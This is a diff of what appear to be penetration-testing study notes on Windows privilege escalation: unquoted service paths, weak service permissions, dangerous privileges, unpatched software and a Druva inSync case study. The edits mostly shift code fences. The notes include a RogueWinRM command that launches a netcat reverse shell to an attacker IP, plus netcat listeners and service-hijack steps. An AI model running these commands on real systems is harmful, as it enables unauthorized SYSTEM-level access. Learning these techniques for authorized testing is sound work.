@@ -87,6 +87,7 @@ sc start <service-name>
 #catch the reverse shell using netcat or socat or whatever you like bleh :p
 ``````
 Unquoted Service Paths
+``````
 //an obscure feature for forcing a service into running arbitrary executables when we directly can’t write into service executables
 /*While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited. */
 //check for BUILT_IN\Users for AD and WD permissions (allows you to create sub directories and files under the queried folder)
@@ -95,8 +96,8 @@ sc stop “service name”
 sc start “service name”
 catch the reverse shell
 ``````
-``````
 Insecure Service Permissions
+``````
 Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
 //use accesschk from SysInternals suite
 accesschk64.exe -qlc <service-name>       #check DACL for service
@@ -108,8 +109,9 @@ sc stop <service-name>
 sc start <service-name>
 //catch the reverse shell with higher privilege
 ``````
-```
+
 Abusing Dangerous Privileges
+```
 whoami /priv
 https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
 https://github.com/gtworek/Priv2Admin
@@ -159,15 +161,15 @@ nc -nvlp <port>
 <path-for-RogueWinRM>\RogueWinRM.exe -p “<path-to-netcat>\nc64.exe” -a “-e cmd.exe <attacker-ip> <port>”
 //catch the reverse shell with nt/authority privileges
 ``````
-```
 Unpatched Software
-```
+``````
 Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
 wmic product get name,version,vendor
 Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
 Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, packet storm or plain old Google, amongst many others.
 ``````
 Case Study: Druva inSync 6.6.3
+``````
 The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by Chris Lyne.
 The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.
 In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.
